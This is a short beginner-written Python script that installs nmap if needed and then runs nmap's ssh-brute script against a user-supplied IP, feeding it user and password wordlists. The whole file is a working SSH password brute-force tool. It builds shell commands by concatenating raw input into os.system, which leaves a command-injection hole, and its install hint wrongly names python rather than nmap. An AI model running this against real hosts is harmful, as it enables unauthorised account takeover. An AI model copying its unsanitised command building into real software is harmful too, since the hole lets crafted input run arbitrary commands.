import os
# script from bigginer python devloper :)
print ("""          ####################################################
          # NOTE: USE THIS SCRIPT AT YOUR OWN LAP AND DEVICES #
          ####################################################""")
are = input("Do you have nmap installed answer Y or N:")
print ("IF YOU DON'T HAVE NMAP JUST USE THIS COMMAND |sudo apt install python|")

if are == "N":
    os.system("sudo apt install nmap")
if are == "n":
    os.system("sudo apt install nmap")

ip = input("Enter target ip:")
user = input("user wordlist:")
passwords = input("password list:")

os.system ("nmap --script ssh-brute -p22 "+ip+" --script-args userdb="+user+",passdb="+passwords+"")
